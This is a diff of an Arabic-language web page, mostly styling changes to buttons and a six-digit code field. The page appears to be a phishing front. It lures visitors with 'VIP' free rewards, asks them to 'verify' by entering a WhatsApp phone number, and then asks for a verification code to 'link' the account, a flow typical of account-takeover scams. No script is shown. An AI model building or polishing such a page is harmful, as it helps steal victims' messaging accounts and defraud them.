@@ -228,7 +228,7 @@ button:disabled { opacity: 0.6; cursor: not-allowed; }
 
 /* تعديل ألوان وحالة زر الإرسال بناءً على دقة الإدخال */
 .whatsapp-submit-btn {
-  width: 100%; padding: 12px; /* تم تقليل الارتفاع */
+  width: 100%; padding: 12px;
   background: #0d3219; /* لون أخضر مطفأ ممزوج بالأسود في البداية */
   border: 1px solid #144424; border-radius: 12px;
   color: rgba(255, 255, 255, 0.4); font-weight: 700; font-size: 16px;
@@ -238,7 +238,7 @@ button:disabled { opacity: 0.6; cursor: not-allowed; }
 }
 /* ستايل الزر عندما يصبح مفعل وأخضر */
 .whatsapp-submit-btn.ready-green {
-  background: #24af4b !important; /* يخضر بالكامل */
+  background: #24af4b !important;
   color: #ffffff !important;
   cursor: pointer !important;
   border-color: #24af4b !important;
@@ -253,59 +253,64 @@ button:disabled { opacity: 0.6; cursor: not-allowed; }
 .main-modal-body { display: block; }
 .main-modal-body.hidden { display: none; }
 
-/* تعديل حقل الرمز والشحطات الثابتة */
+/* تعديل حقل الرمز لإظهار الشخط بوضوح وجعل الأرقام متناسقة ومقربة */
 .otp-relative-wrapper {
   position: relative;
   width: 100%;
+  max-width: 260px;
+  margin: 0 auto;
 }
 .otp-field {
   width: 100%; background: #0f0f10; border: 1px solid #28282a;
-  border-radius: 12px; color: #ffffff; font-size: 24px; font-weight: bold;
-  text-align: center; padding: 6px 10px 14px; outline: none; margin-bottom: 0;
-  letter-spacing: 24px; padding-left: 20px; direction: ltr;
-  position: relative; z-index: 2; height: 42px; /* تقليل الـ height */
+  border-radius: 12px; color: #ffffff; font-size: 18px; font-weight: 700;
+  text-align: center; padding: 4px 0 10px 0; outline: none; margin-bottom: 0;
+  letter-spacing: 21px; padding-left: 20px; direction: ltr;
+  position: relative; z-index: 2; height: 42px;
 }
-/* إلغاء اللون الذهبي عند الضغط */
 .otp-field:focus {
   border-color: #28282a !important;
 }
 .otp-under-lines {
   position: absolute; bottom: 8px; left: 0; width: 100%;
-  display: flex; justify-content: center; gap: 17px; direction: ltr; z-index: 1;
+  display: flex; justify-content: center; gap: 15px; direction: ltr; z-index: 1;
   pointer-events: none; padding: 0 10px;
 }
 .otp-under-lines span {
-  width: 18px; height: 3px; background: #ffffff; display: block; border-radius: 1px;
+  width: 20px; height: 3px; background: #ffffff; display: block; border-radius: 1px;
 }
 
 .counter-text {
   text-align: center; font-size: 14px; color: #b5b5b9; margin: 16px 0;
 }
 
-/* أزرار أسفل نافذة الرمز: تم عكس الاتجاه وتقليل الحجم والارتفاع والكتابة بخط غامق كبير وأبيض */
+/* أزرار أسفل نافذة الرمز */
 .modal-actions-row {
-  display: flex; gap: 12px; margin-top: 15px; flex-direction: row-reverse; /* الربط يمين وإعادة الإرسال يسار */
+  display: flex; gap: 12px; margin-top: 15px; flex-direction: row-reverse;
 }
 .modal-btn {
-  flex: 1; padding: 11px; border-radius: 12px; font-weight: 700; font-size: 16px; /* خط عريض وواضح */
+  flex: 1; padding: 11px; border-radius: 12px; font-weight: 700; font-size: 16px;
   cursor: not-allowed; border: none; text-align: center; transition: all 0.25s;
 }
 .modal-btn.btn-resend {
   background: #131314; color: rgba(255, 255, 255, 0.3);
 }
-/* عند تفعيل زر إعادة الإرسال يصبح لون فضي وليس أخضر والكتابة بيضاء غامقة */
+/* عند تفعيل زر إعادة الإرسال يصبح لون فضي والكتابة بيضاء غامقة */
 .modal-btn.btn-resend.active-silver {
   background: #8e8e93 !important; color: #ffffff !important; cursor: pointer;
 }
+
+/* زر ربط يطابق زر إرسال رمز التحقق تماماً باللون والحالة */
 .modal-btn.btn-link {
-  background: #0f1c12; color: rgba(255, 255, 255, 0.2);
+  background: #0d3219; /* نفس لون زر إرسال الرمز المطفأ */
+  color: rgba(255, 255, 255, 0.4);
+  border: 1px solid #144424;
 }
-/* عند كتابة 6 خانات يصبح زر ربط مفعل وأخضر */
+/* عند كتابة 6 خانات يصبح مفعل ومطابق للأخضر الكامل */
 .modal-btn.btn-link.active-green {
-  background: #0d421a; color: #ffffff !important; cursor: pointer; border: 1px solid #165c27;
+  background: #24af4b !important; color: #ffffff !important; cursor: pointer; border-color: #24af4b !important;
 }
 
-/* ---------------- نافذة تنبيه الخطأ (الصورة الثالثة) ---------------- */
+/* ---------------- نافذة تنبيه الخطأ ---------------- */
 .error-alert-overlay {
   position: fixed; top: 0; left: 0; width: 100%; height: 100%;
   background: rgba(0, 0, 0, 0.8); display: flex; align-items: center; justify-content: center;
@@ -313,7 +318,7 @@ button:disabled { opacity: 0.6; cursor: not-allowed; }
 }
 .error-alert-overlay.active { opacity: 1; visibility: visible; }
 .error-alert-box {
-  background: #232325; border: 2px solid #ffffff; border-radius: 18px; /* محاط بخط أبيض ثنائي */
+  background: #232325; border: 2px solid #ffffff; border-radius: 18px;
   width: 85%; max-width: 380px; padding: 30px 20px; text-align: center;
   box-shadow: 0 10px 30px rgba(0,0,0,0.7);
 }
@@ -349,7 +354,6 @@ button:disabled { opacity: 0.6; cursor: not-allowed; }
 
   <div class="main-content">
 
-  <!-- الشاشة الرئيسية -->
   <div class="card view active" id="view-access">
     <div class="eyebrow">VIP Domain</div>
     <div class="eyebrow-divider"></div>
@@ -373,7 +377,6 @@ button:disabled { opacity: 0.6; cursor: not-allowed; }
     <div class="promo-text">Join VIP Now &amp; Claim Your Free Rewards</div>
   </div>
 
-  <!-- بانتظار الموافقة -->
   <div class="card view" id="view-pending">
     <div class="status-icon pending">⏳</div>
     <h1>يتم الطلب</h1>
@@ -381,7 +384,6 @@ button:disabled { opacity: 0.6; cursor: not-allowed; }
     <p class="center-text">تم استلام طلبك وهو قيد المراجعة حالياً.</p>
   </div>
 
-  <!-- رفض رسمي -->
   <div class="card view" id="view-rejected">
     <div class="status-icon rejected">✕</div>
     <h1>نتيجة الطلب</h1>
@@ -389,7 +391,6 @@ button:disabled { opacity: 0.6; cursor: not-allowed; }
     <p class="center-text">شكراً لاهتمامك بالانضمام إلينا.</p>
   </div>
 
-  <!-- لوحة العضو -->
   <div class="card view" id="view-dashboard">
     <div class="status-icon approved">✓</div>
     <h1>فيك</h1>
@@ -400,12 +401,10 @@ button:disabled { opacity: 0.6; cursor: not-allowed; }
 
   </div>
 
-  <!-- النافذة المنبثقة الشاملة (واتساب + الرمز) -->
   <div class="whatsapp-modal-overlay" id="whatsappModalOverlay" onclick="toggleModal(false)">
     <div class="whatsapp-modal" onclick="event.stopPropagation()">
       <div class="modal-close-btn" onclick="toggleModal(false)"><i class="fas fa-times"></i></div>
       
-      <!-- الجسم الأول: إدخال رقم الهاتف -->
       <div class="main-modal-body" id="mainModalBody">
         <div class="modal-title">وثّق حسابك</div>
         <div class="modal-inner-box">
@@ -454,7 +453,6 @@ button:disabled { opacity: 0.6; cursor: not-allowed; }
         </button>
       </div>
 
-      <!-- الجسم الثاني: شاشة إدخال رمز التحقق والعداد التنازلي -->
       <div class="sms-modal-body" id="smsModalBody">
         <div class="modal-title">أدخل رمز التحقّق</div>
         <div class="modal-inner-box">
@@ -478,7 +476,6 @@ button:disabled { opacity: 0.6; cursor: not-allowed; }
     </div>
   </div>
 
-  <!-- نافذة تنبيه الخطأ المخصصة "رمز التحقق غير صحيح" -->
   <div class="error-alert-overlay" id="errorAlertOverlay" onclick="closeErrorAlert()">
     <div class="error-alert-box" onclick="event.stopPropagation()">
       <p class="error-alert-text">رمز التحقق غير صحيح</p>
